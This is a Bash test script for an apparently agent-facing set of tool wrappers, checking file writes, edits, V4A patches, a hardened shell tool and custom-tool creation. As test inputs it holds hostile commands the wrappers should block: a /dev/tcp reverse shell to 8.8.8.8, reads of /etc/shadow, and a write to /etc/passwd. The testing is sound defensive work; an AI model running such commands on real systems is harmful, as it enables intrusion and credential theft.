#!/bin/bash
# End-to-end test of the new tool wrappers in a temp scratch area.
# Runs each tool through its real Bash entrypoint with TOOL_* env vars.

set -u
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
TMP="$(mktemp -d -t ama_tools_XXXX)"
trap 'rm -rf "$TMP"' EXIT
cd "$ROOT"

pass=0
fail=0

_check() {
    local label="$1"
    local rc="$2"
    local expected_rc="${3:-0}"
    if [[ "$rc" == "$expected_rc" ]]; then
        echo "  ✅ $label"
        pass=$((pass + 1))
    else
        echo "  ❌ $label (rc=$rc, want=$expected_rc)"
        fail=$((fail + 1))
    fi
}

mkdir -p "$ROOT/tools/_lib/_tmp_test"
SCRATCH="$ROOT/tools/_lib/_tmp_test"

echo "── write_file.sh ──"
cat > "$SCRATCH/test_write.txt.expected" <<EOF
hello
world
EOF
TOOL_path="tools/_lib/_tmp_test/test_write.txt" \
TOOL_content="$(cat "$SCRATCH/test_write.txt.expected")" \
bash tools/write_file.sh > "$TMP/o1" 2>&1
_check "write new file" $?

TOOL_path="tools/_lib/_tmp_test/bad.sh" \
TOOL_content='function broken( {
  echo bad
' bash tools/write_file.sh > "$TMP/o2" 2>&1
rc=$?
if [[ $rc -ne 0 ]] && grep -q "syntax error" "$TMP/o2"; then
    echo "  ✅ rejects bad bash syntax"
    pass=$((pass + 1))
else
    echo "  ❌ should reject bad bash (rc=$rc, output=$(cat $TMP/o2))"
    fail=$((fail + 1))
fi

TOOL_path="/etc/passwd" TOOL_content="x" bash tools/write_file.sh > "$TMP/o3" 2>&1
rc=$?
if [[ $rc -ne 0 ]] && grep -qi "sensitive\|outside" "$TMP/o3"; then
    echo "  ✅ refuses /etc/passwd"
    pass=$((pass + 1))
else
    echo "  ❌ should refuse /etc/passwd (rc=$rc)"
    fail=$((fail + 1))
fi

echo "── read_code.sh ──"
TOOL_path="tools/_lib/_tmp_test/test_write.txt" \
bash tools/read_code.sh > "$TMP/o4" 2>&1
_check "read existing file" $?
grep -q "1| hello" "$TMP/o4" || { echo "  ❌ expected line numbers, got: $(cat $TMP/o4)"; fail=$((fail + 1)); }

TOOL_path="tools/_lib/_tmp_test/test_write.txt" TOOL_offset=2 TOOL_limit=1 \
bash tools/read_code.sh > "$TMP/o5" 2>&1
_check "read with offset+limit" $?

echo "── edit_code.sh ──"
TOOL_path="tools/_lib/_tmp_test/test_write.txt" \
TOOL_old_string="hello" \
TOOL_new_string="HELLO" \
bash tools/edit_code.sh > "$TMP/o6" 2>&1
_check "exact single-line edit" $?
grep -q "HELLO" "$SCRATCH/test_write.txt" || { echo "  ❌ file not updated"; fail=$((fail + 1)); }

# Multi-line edit with whitespace tolerance
cat > "$SCRATCH/multi.py" <<'EOF'
def foo():
    print('a')
    return 1

def bar():
    pass
EOF
TOOL_path="tools/_lib/_tmp_test/multi.py" \
TOOL_old_string="    print('a')
    return 1" \
TOOL_new_string="    print('A')
    return 99" \
bash tools/edit_code.sh > "$TMP/o7" 2>&1
_check "multi-line edit" $?
grep -q "return 99" "$SCRATCH/multi.py" || { echo "  ❌ multi-line not applied"; fail=$((fail + 1)); }

# Did-you-mean on miss
TOOL_path="tools/_lib/_tmp_test/multi.py" \
TOOL_old_string="def nonexistent_function():" \
TOOL_new_string="def x():" \
bash tools/edit_code.sh > "$TMP/o8" 2>&1
rc=$?
if [[ $rc -ne 0 ]] && grep -q "Did you mean" "$TMP/o8"; then
    echo "  ✅ no-match emits did-you-mean hint"
    pass=$((pass + 1))
else
    echo "  ❌ expected did-you-mean (rc=$rc)"
    cat "$TMP/o8"
    fail=$((fail + 1))
fi

# Edit must reject syntax-breaking changes
TOOL_path="tools/_lib/_tmp_test/multi.py" \
TOOL_old_string="def bar():
    pass" \
TOOL_new_string="def bar(:
    pass" \
bash tools/edit_code.sh > "$TMP/o9" 2>&1
rc=$?
if [[ $rc -ne 0 ]] && grep -qi "syntax" "$TMP/o9"; then
    echo "  ✅ rejects syntax-breaking edit"
    pass=$((pass + 1))
else
    echo "  ❌ should reject (rc=$rc)"
    fail=$((fail + 1))
fi

echo "── patch.sh (V4A) ──"
cat > "$SCRATCH/patchme.txt" <<'EOF'
line one
line two
line three
EOF
read -r -d '' PATCH_BODY <<EOF || true
*** Begin Patch
*** Update File: tools/_lib/_tmp_test/patchme.txt
@@
 line one
-line two
+LINE TWO
 line three
*** Add File: tools/_lib/_tmp_test/created.txt
+brand new
+second line
*** End Patch
EOF
TOOL_patch="$PATCH_BODY" bash tools/patch.sh > "$TMP/o10" 2>&1
_check "v4a multi-op patch" $?
grep -q "LINE TWO" "$SCRATCH/patchme.txt" && [[ -f "$SCRATCH/created.txt" ]] \
    || { echo "  ❌ patch didn't apply expected changes"; cat "$TMP/o10"; fail=$((fail + 1)); }

# Validate-fail-cleanly: bad hunk should leave files alone
cat > "$SCRATCH/safe.txt" <<'EOF'
keep me
EOF
read -r -d '' BAD_PATCH <<EOF || true
*** Begin Patch
*** Update File: tools/_lib/_tmp_test/safe.txt
@@
-this text does not exist
+nope
*** End Patch
EOF
TOOL_patch="$BAD_PATCH" bash tools/patch.sh > "$TMP/o11" 2>&1
rc=$?
if [[ $rc -ne 0 ]] && grep -q "validation failed" "$TMP/o11"; then
    echo "  ✅ bad patch rejected without touching files"
    pass=$((pass + 1))
else
    echo "  ❌ expected validation rejection (rc=$rc)"
    fail=$((fail + 1))
fi
grep -q "^keep me$" "$SCRATCH/safe.txt" || { echo "  ❌ safe.txt was modified!"; fail=$((fail + 1)); }

echo "── bash.sh (hardened) ──"
TOOL_command="echo hello" bash tools/bash.sh > "$TMP/o12" 2>&1
_check "harmless echo" $?
grep -q "^hello$" "$TMP/o12" || { echo "  ❌ unexpected output: $(cat $TMP/o12)"; fail=$((fail + 1)); }

# Should block reading shadow file
TOOL_command="cat /etc/shadow" bash tools/bash.sh > "$TMP/o13" 2>&1
rc=$?
if [[ $rc -ne 0 ]] && grep -q "blocked" "$TMP/o13"; then
    echo "  ✅ blocks /etc/shadow read"
    pass=$((pass + 1))
else
    echo "  ❌ should block (rc=$rc, out=$(cat $TMP/o13))"
    fail=$((fail + 1))
fi

# Should block reverse shell pattern
TOOL_command="bash -i >/dev/tcp/8.8.8.8/4444 0>&1" bash tools/bash.sh > "$TMP/o14" 2>&1
rc=$?
if [[ $rc -ne 0 ]] && grep -q "blocked" "$TMP/o14"; then
    echo "  ✅ blocks /dev/tcp reverse shell"
    pass=$((pass + 1))
else
    echo "  ❌ should block (rc=$rc)"
    fail=$((fail + 1))
fi

# Timeout behaviour
TOOL_command="sleep 5" TOOL_timeout=1 bash tools/bash.sh > "$TMP/o15" 2>&1
rc=$?
if grep -q "timeout" "$TMP/o15"; then
    echo "  ✅ honours timeout"
    pass=$((pass + 1))
else
    echo "  ❌ timeout not enforced (rc=$rc, out=$(cat $TMP/o15))"
    fail=$((fail + 1))
fi

echo "── custom_tool_manager.sh ──"
TOOL_action="create" TOOL_name="mytest_tool_xyz" TOOL_description="test" \
TOOL_code='echo "hi from $TOOL_name_param"' \
TOOL_parameters_json='{"type":"object","properties":{"name_param":{"type":"string"}},"required":[]}' \
bash tools/custom_tool_manager.sh > "$TMP/o16" 2>&1
_check "create custom tool" $?
[[ -f "$ROOT/tools/custom/mytest_tool_xyz.sh" ]] || { echo "  ❌ tool file not created"; fail=$((fail + 1)); }

# Reject bad bash syntax in custom tool
TOOL_action="create" TOOL_name="bad_tool_xyz" TOOL_description="bad" \
TOOL_code='function broken( { echo nope' \
TOOL_parameters_json='{"type":"object","properties":{}}' \
bash tools/custom_tool_manager.sh > "$TMP/o17" 2>&1
rc=$?
if [[ $rc -ne 0 ]] && grep -qi "syntax" "$TMP/o17"; then
    echo "  ✅ rejects bad bash syntax in custom tool"
    pass=$((pass + 1))
else
    echo "  ❌ should reject (rc=$rc)"
    fail=$((fail + 1))
fi

# Reject dangerous patterns
TOOL_action="create" TOOL_name="evil_tool_xyz" TOOL_description="bad" \
TOOL_code='cat /etc/shadow > /tmp/x' \
TOOL_parameters_json='{"type":"object","properties":{}}' \
bash tools/custom_tool_manager.sh > "$TMP/o18" 2>&1
rc=$?
if [[ $rc -ne 0 ]] && grep -q "blocked\|refused" "$TMP/o18"; then
    echo "  ✅ rejects dangerous custom tool"
    pass=$((pass + 1))
else
    echo "  ❌ should reject (rc=$rc, out=$(cat $TMP/o18))"
    fail=$((fail + 1))
fi

# Refuse to shadow built-in
TOOL_action="create" TOOL_name="bash" TOOL_description="x" \
TOOL_code='echo override' \
TOOL_parameters_json='{"type":"object","properties":{}}' \
bash tools/custom_tool_manager.sh > "$TMP/o19" 2>&1
rc=$?
if [[ $rc -ne 0 ]] && grep -q "built-in" "$TMP/o19"; then
    echo "  ✅ refuses to shadow built-in tool"
    pass=$((pass + 1))
else
    echo "  ❌ should refuse (rc=$rc)"
    fail=$((fail + 1))
fi

# Cleanup
TOOL_action="delete" TOOL_name="mytest_tool_xyz" bash tools/custom_tool_manager.sh > /dev/null 2>&1
rm -rf "$SCRATCH"

echo
echo "──────────────────────────"
echo "  passed: $pass"
echo "  failed: $fail"
echo "──────────────────────────"
exit $fail
